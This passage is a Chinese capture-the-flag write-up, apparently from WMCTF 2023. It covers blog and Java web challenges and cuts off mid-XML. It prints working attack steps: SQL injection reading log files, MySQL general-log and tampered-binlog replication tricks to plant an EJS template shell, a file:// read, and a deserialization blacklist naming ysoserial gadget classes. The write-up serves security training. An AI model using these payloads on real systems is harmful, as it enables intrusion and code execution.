<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnF8P"><img src="https://s1.ax1x.com/2023/08/22/pPJnF8P.png" alt="pPJnF8P.png"></a></p>
<p><code>&quot;只要通过PM2 启动的Node.js项目，可以非常方便的查看其输出日志。&quot;</code>，而在app.js里直接将pin码相关信息进行输出，所以在pm2的输出日志<code>main-out.log</code>就能找到pin码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 修复图床功能上传图片失败的问题</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        child_process_1.<span class="property">default</span>.<span class="title function_">execSync</span>(<span class="string">&quot;mkdir -p ./public/images&quot;</span>);</span><br><span class="line">        child_process_1.<span class="property">default</span>.<span class="title function_">execSync</span>(<span class="string">&quot;chmod -R 777 .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">    (<span class="number">0</span>, db_1.<span class="property">init</span>)();</span><br><span class="line">    app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Serving Express app &#x27;ezblog&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debug mode: on&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Running on http://0.0.0.0:3000/ (Press CTRL+C to quit)&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debugger is active!&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debugger PIN: &quot;</span> + pin);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到pin码后登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post/-1 union select 1,load_file(&#x27;%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log&#x27;),3/edit</span><br></pre></td></tr></table></figure>

<p>由于pass掉了<code>&#39;into&#39;, &#39;outfile&#39;, &#39;dumpfile&#39;</code>，不能直接通过<code>select into outfile</code>的方式直接写文件，但还可以利用写日志的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;             #查看配置</span><br><span class="line">set global general_log = on;                 #开启general log模式</span><br><span class="line">set global general_log_file = &#x27;/home/ezblog/views/post.ejs&#x27;; #设置日志目录为shell地址</span><br><span class="line">select &#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;;            #写入shell</span><br></pre></td></tr></table></figure>

<p>在此之前，由于环境为mysql用户，只有infomation和ctf两张表，需要手动创建<code>mysql.general_log</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>分两次执行</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mysql;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.general_log  (</span><br><span class="line">  `event_time` <span class="type">timestamp</span>(<span class="number">6</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">current_timestamp</span>(<span class="number">6</span>) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `user_host` mediumtext <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `thread_id` <span class="type">bigint</span>(<span class="number">21</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `server_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `command_type` <span class="type">varchar</span>(<span class="number">64</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `argument` mediumtext <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE <span class="operator">=</span> CSV <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8mb3 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8mb3_general_ci COMMENT <span class="operator">=</span> <span class="string">&#x27;General log&#x27;</span> ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br></pre></td></tr></table></figure>

<p>最后指定post.ejs渲染即可</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnZDg"><img src="https://s1.ax1x.com/2023/08/22/pPJnZDg.png" alt="pPJnZDg.png"></a></p>
<h2 id="ezblog2"><a href="#ezblog2" class="headerlink" title="ezblog2"></a>ezblog2</h2><p>修改</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">diff --color -r env/docker/docker-compose.yml env2/docker/docker-compose.yml </span><br><span class="line">5c5 </span><br><span class="line">&lt;     image: wmctf2023_ezblog</span><br><span class="line">--- </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    image: wmctf2023_ezblog2</span></span><br><span class="line">diff --color -r env/src/src/app.ts env2/src/src/app.ts</span><br><span class="line">248a249,251</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    try&#123;</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">        child_process.execSync(<span class="string">&quot;chmod -R 444 /home/ezblog/views/*&quot;</span>)</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    &#125; catch (e) &#123; &#125;</span> </span><br></pre></td></tr></table></figure>

<p>修改了目录权限，上诉日志写入方法还是能够成功写入新文件，但由于是mysql用户，写入的新文件无权限读，也不能覆盖原有的文件</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnnEj"><img src="https://s1.ax1x.com/2023/08/22/pPJnnEj.png" alt="pPJnnEj.png"></a></p>
<p>新的利用方法是采用mysql主从复制</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnuUs"><img src="https://s1.ax1x.com/2023/08/22/pPJnuUs.png" alt="pPJnuUs.png"></a></p>
<p>修改主服务器的binlog文件，在从服务器进行检查时，就会执行在主服务器上的命令，借此绕过<code>into outfile</code>限制</p>
<p><strong>主服务器</strong></p>
<p>拉一个和题目版本相同的<code>mariadb:10.9.8</code></p>
<p>修改<code>/etc/my.cnf</code>，没有就创建一个，在下面添加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id       = 2</span><br><span class="line">secure_file_priv=</span><br><span class="line">log-bin         = mysql-bin ## 开启二进制日志功能</span><br></pre></td></tr></table></figure>

<p>重启mariadb，<code>service mariadb restart</code></p>
<p>在数据库里配置</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> binlog_checksum <span class="operator">=</span> <span class="keyword">NONE</span>; #关闭CRC32,否则执行时会出错</span><br><span class="line">reset master; #需要重置主服务器，不然前面创建用户的命令会被记录，导致报错</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> database test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flagtable(id <span class="type">int</span>,name <span class="type">varchar</span>(<span class="number">120</span>),age <span class="type">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flagtable(id, name, age) <span class="keyword">VALUES</span>(<span class="number">1</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure>

<p>因为Binary Log不会记录select语句，需要把生成的binlog文件拿出来进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp mydb:/var/lib/mysql/mysql-bin.000001 mysql-bin.000001</span><br></pre></td></tr></table></figure>

<p>替换insert语句为select语句从而写入shell，特别注意select和insert命令长度必须一样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/ezblog/views/114.ejs&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnK5n"><img src="https://s1.ax1x.com/2023/08/22/pPJnK5n.png" alt="pPJnK5n.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJn12V"><img src="https://s1.ax1x.com/2023/08/22/pPJn12V.png" alt="pPJn12V.png"></a></p>
<p>修改后（放回数据库容器里）使用mysqlbinlog检查文件是否报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp mysql-bin.000001 mydb:/var/lib/mysql/mysql-bin.000001</span><br><span class="line">mysqlbinlog mysql-bin.000001</span><br></pre></td></tr></table></figure>

<p><strong>从服务器</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.gtid_slave_pos  (`domain_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`sub_id` <span class="type">bigint</span>(<span class="number">20</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`server_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`seq_no` <span class="type">bigint</span>(<span class="number">20</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,<span class="keyword">PRIMARY</span> KEY (`domain_id`, `sub_id`) <span class="keyword">USING</span> BTREE) ENGINE <span class="operator">=</span> InnoDB <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> latin1 <span class="keyword">COLLATE</span> <span class="operator">=</span> latin1_swedish_ci COMMENT <span class="operator">=</span> <span class="string">&#x27;Replication slave GTID position&#x27;</span> ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>; #需要手动创建mysql.gtid_slave_pos</span><br><span class="line"></span><br><span class="line">change master <span class="keyword">to</span> master_host<span class="operator">=</span><span class="string">&#x27;ip&#x27;</span>, master_user<span class="operator">=</span><span class="string">&#x27;slave&#x27;</span>, master_password<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>, master_port<span class="operator">=</span><span class="number">8001</span>, master_log_file<span class="operator">=</span><span class="string">&#x27;mysql-bin.000001&#x27;</span>, master_log_pos<span class="operator">=</span><span class="number">0</span>, master_connect_retry<span class="operator">=</span><span class="number">30</span>; #替换成对应的配置，master_log_pos都从<span class="number">0</span>开始就好</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> slave; #启动复制</span><br><span class="line"><span class="keyword">show</span> slave status;</span><br></pre></td></tr></table></figure>

<p>成功应如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJn3vT"><img src="https://s1.ax1x.com/2023/08/22/pPJn3vT.png" alt="pPJn3vT.png"></a></p>
<p>最后去渲染写进去的ejs模板就好，可以看到通过select写进去的文件可读</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnJrF"><img src="https://s1.ax1x.com/2023/08/22/pPJnJrF.png" alt="pPJnJrF.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJI8N6"><img src="https://s1.ax1x.com/2023/08/23/pPJI8N6.png" alt="pPJI8N6.png"></a></p>
<h2 id="你的权限放着我来"><a href="#你的权限放着我来" class="headerlink" title="你的权限放着我来"></a>你的权限放着我来</h2><p>扫出<code>/change</code>路由，修改<code>jom@roomke.com</code>的密码 得到flag flag{test_flag}</p>
<h2 id="ez-java-agagin-rev"><a href="#ez-java-agagin-rev" class="headerlink" title="ez_java_agagin_rev"></a>ez_java_agagin_rev</h2><p>同样的读文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:////usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/ctf/help_me/Servlet/CmdServlet.class%23java</span><br></pre></td></tr></table></figure>

<p>下载后的<code>.class</code>文件和<code>0xff</code>做过异或，不能直接被反编译，需要和<code>0xff</code>异或回去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Imagefile&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> original_file:</span><br><span class="line">    original_data = original_file.read()</span><br><span class="line"></span><br><span class="line">xored_data = <span class="built_in">bytes</span>(byte ^ <span class="number">0xff</span> <span class="keyword">for</span> byte <span class="keyword">in</span> original_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;CmdServlet.class&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">    new_file.write(xored_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CmdServlet.class 文件已生成&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>CmdServlet.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.help_me.Servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.configuration.ConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;CmdServlet&quot;, urlPatterns = &#123;&quot;/closetome&quot;&#125;)</span></span><br><span class="line"><span class="comment">/* loaded from: Imagefile */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] b = Base64.getDecoder().decode(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois = <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b), <span class="string">&quot;config/serialkiller.xml&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个明了的反序列化点，但加载了<code>config/serialkiller.xml</code>对反序列化进行限制</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="comment">&lt;!--  serialkiller.conf  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mode</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  set to &#x27;false&#x27; for blocking mode  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profiling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">profiling</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  ysoserial&#x27;s CommonsCollections1,3,5,6 payload   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functorsFactoryTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.BadAttributeValueExpException$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.security\.SignedObject$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functorsFactoryTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  ysoserial&#x27;s CommonsCollections2,4 payload   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.beanutils\.BeanComparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.rowset\.JdbcRowSetImpl$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.registry\.Registry$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.ObjID$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.RemoteObjectInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.AdvisedSupport$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.target\.SingletonTargetSource$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.util\.PriorityQueue$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.lang\.reflect\.Proxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.MBeanServerInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.openmbean\.CompositeDataInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.beans\.EventHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.util\.Comparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.reflections\.Reflections$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 